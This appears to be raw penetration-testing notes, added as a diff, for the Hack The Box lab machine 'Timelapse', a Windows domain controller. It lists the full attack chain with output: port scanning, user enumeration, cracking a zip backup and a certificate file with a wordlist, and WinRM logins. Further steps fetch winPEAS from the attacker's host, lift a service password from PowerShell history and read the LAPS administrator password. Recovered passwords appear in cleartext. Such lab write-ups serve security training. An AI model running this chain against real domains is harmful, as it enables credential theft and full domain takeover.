@@ -1,0 +1,172 @@
+nmap -sC -sV -oA nmap 10.10.11.152 -Pn
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-26 19:24 GMT
+Nmap scan report for 10.10.11.152
+Host is up (0.20s latency).
+Not shown: 989 filtered tcp ports (no-response)
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-03-28 05:51:50Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Issuer: commonName=dc01.timelapse.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-10-25T14:05:29
+| Not valid after:  2022-10-25T14:25:29
+| MD5:   e233 a199 4504 0859 013f b9c5 e4f6 91c3
+|_SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
+|_ssl-date: 2022-03-28T05:53:23+00:00; +8h00m14s from scanner time.
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc             Microsoft Windows RPC
+49696/tcp open  msrpc             Microsoft Windows RPC
+63941/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8h00m13s, deviation: 0s, median: 8h00m12s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-03-28T05:52:41
+|_  start_date: N/A
+                                                                       
+                                                                                                                  
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                    
+Nmap done: 1 IP address (1 host up) scanned in 87.07 seconds                                   
+
+
+
+crackmapexec smb 10.10.11.152
+SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)      
+
+
+smbclient \\\\10.10.11.152\\shares
+
+kali@kali:~/hackthebox/timelapse$ ./kerbrute_linux_amd64 userenum --dc timelapse.htb -d timelapse.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
+
+PASSWORD FOUND!!!!: pw == supremelegacy
+
+
+
+
+
+
+
+
+
+
+ldapsearch -x -h 10.10.11.152 -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=timelapse,DC=htb
+namingcontexts: CN=Configuration,DC=timelapse,DC=htb
+namingcontexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
+namingcontexts: DC=DomainDnsZones,DC=timelapse,DC=htb
+namingcontexts: DC=ForestDnsZones,DC=timelapse,DC=htb
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+
+
+ldapsearch -x -h 10.10.11.152 -s sub -b 'DC=timelapse,DC=htb'
+# extended LDIF
+#
+# LDAPv3
+# base <DC=timelapse,DC=htb> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1
+
+
+crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx 
+
+Dictionary attack - Starting 4 threads
+
+*********************************************************
+Dictionary attack - Thread 2 - Password found: thuglegacy
+*********************************************************
+
+
+
+https://linuxcommandlibrary.com/man/evil-winrm
+
+
+evil-winrm --ip 10.10.11.152 --user legacyy --password supremelegacy --ssl --pub-key certificate.pem --priv-key priv-key.pem
+
+
+
+wget 10.10.14.116:8000/winPEASx64.exe -o winPEASx64.exe
+
+type C:\Users\legacyy\appdata\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+
+
+evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+
+Get-ADComputer -Identity "DC01" -Server "timelapse.htb" -properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime | select-object ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+
+ms-mcs-admpwd            ms-mcs-admpwdexpirationtime
+-------------            ---------------------------
+C&dE+$+!nj];{5}eNFbc}716          132934956445930773
+
+
+
+
+
+
+
+
+evil-winrm -i 10.10.11.152 -u administrator -p 'C&dE+$+!nj];{5}eNFbc}716' -S
+
+
+root flag /users/TRX
